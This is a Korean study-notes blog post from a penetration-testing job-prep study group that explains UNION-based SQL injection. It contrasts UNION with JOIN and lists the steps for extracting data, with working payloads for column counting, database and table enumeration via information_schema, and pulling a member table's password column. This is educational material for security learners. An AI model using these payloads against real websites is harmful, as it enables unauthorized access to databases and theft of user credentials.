---
layout: post
comments: true
title: UNION 기반 SQL Injection의 원리와 데이터 추출 과정
excerpt: 모의해킹 취업반 스터디 7기 6주차
date: 2024-11-20
last_modified_at: 2026-11-02
categories: []
tags:
  - TIL
  - WEB
  - DATABASE
  - SECURITY
---

# Union SQL Injection

전체 공격 유형과 대응 방안은 [SQL Injection 정리]({% post_url SECURITY/SECURITY_FUNDAMENTALS/2024-11-14-SQL-Injection %})에서 다룬다. 결과가 화면에 직접 출력되지 않는 경우는 [Blind SQL Injection]({% post_url SECURITY/SECURITY_FUNDAMENTALS/2024-11-28-Blind-SQL-Injection %})과 비교해 볼 수 있다.

## Union SQL Injection이란?
: 웹페이지에 데이터가 나오는 경우에서 데이터를 추출하는 방법

## UNION VS JOIN

|구분|UNION|JOIN|
|---|---|---|
|**결합 방식**|**수직 결합** (행(Row)을 아래로 이어 붙임)|**수평 결합** (열(Column)을 옆으로 확장함)|
|**결과 행(Row) 수**|두 쿼리의 행이 합쳐져 **증가**함|조건에 따라 유지되거나 줄어듦/증가함|
|**결과 열(Column) 수**|열의 개수와 데이터 타입이 **일치**해야 함|테이블 구조가 달라도 공통 키(Key)로 연결 가능함|
|**중복 처리**|기본적으로 중복 행 **제거** (`UNION ALL` 사용 시 중복 포함)|중복 제거 기능 없음 (조건에 맞는 데이터 매칭)|
|**주요 목적**|성격이 비슷한 데이터셋을 **하나의 목록**으로 합칠 때|서로 다른 테이블의 **관련 정보**를 한 번에 조회할 때|

## Union SQL Injection 공격 Point

1. DB를 사용하는 곳
2. 그 데이터가 화면에 나오는 곳곳
    1. 게시판
    2. 로그인, 아이디 중복체크 등

## UNION 연산자 사용 조건

1. 기존 SELECT 문과 UNION SELECT 문의 컬럼 개수가 동일해야 한다.
2. 각 컬럼은 순서 별로 동일한 데이터형이어야 한다.

## ORDER BY
출력되는 데이터 정렬할 때 사용
`SELECT ~ ORDER BY [COLUMN]`

## UNION SQL INJECTION Process

1. SQLi 취약점 존재 여부를 확인한다.
2. Union SQLi
	1. 컬럼 개수를 확인한다.
	2. 출력되는 컬럼 위치를 찾는다.
	3. 컬럼 데이터형을 확인한다.
3. 데이터 탈취
	1. DB 이름을 확인한다.
	2. 테이블 이름을 확인한다.
	3. 컬럼 이름을 확인한다.
	4. 원하는 데이터를 추출한다.

4. sql injection 포인트 찾기  
`' and '1' = '1`
5. column 개수 찾기  
`' order by 1...n #`
6. 출력되는 column 위치 찾기  
`' union select 1, 2, 3, 4 #`  
-> select 1, 2, 3, 4가 왜 정상적으로 작동하는 거야???  
-> `' union select 1, pass, 3, 4 from member #`  
7. db 이름 확인  
`select database()`  
-> `' union select 1, database(), 3, 4 from member #`
8. table 이름 확인  
`select table_name from information_schema.tables where table_schema = [DB 이름]`  
-> `' union select 1, table_name, 3, 4 from information_schema.tables where table_schema = [DB 이름] #`
9. column 이름 확인  
`select column_name from information_schema.columns where table_name = [table 이름]`  
-> `' union select 1, column_name, 3, 4 from information_schema.columns where table_name = [table 이름] #`
10. data 추출

## 참고

1. https://www.redirhub.com/ko/blog/redirect-types-and-seo-effects-2
2. https://developer.mozilla.org/ko/docs/Web/HTTP/Redirections
3. <https://sqlfiddle.com/>
4. <https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet>
5. <https://blog.naver.com/sk_shieldus/222734386644>

<div class="obsidian-links" style="display: none;">

[\[SECURITY\] SQL Injection 정리](2024-11-14-SQL-Injection.md)
[\[CTF\] CTF 문제 풀이: SQL Injection w. UNION](../CTF/2024-11-25-CTF-SQL-Injection-2.md)

</div>
